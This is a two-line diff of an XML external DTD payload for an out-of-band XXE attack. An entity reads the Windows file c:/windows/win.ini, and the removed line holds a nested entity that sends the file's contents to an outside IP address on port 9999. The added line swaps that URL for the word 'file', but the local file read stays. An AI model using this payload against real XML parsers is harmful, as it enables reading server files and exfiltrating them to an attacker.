@@ -1,2 +1,2 @@
 <!ENTITY % file SYSTEM "file:///c:/windows/win.ini">
-<!ENTITY % int "<!ENTITY &#37; send SYSTEM 'http://116.62.100.78:9999?p=%file;'>">
+<!ENTITY % int "<!ENTITY &#37; send SYSTEM 'file'>">
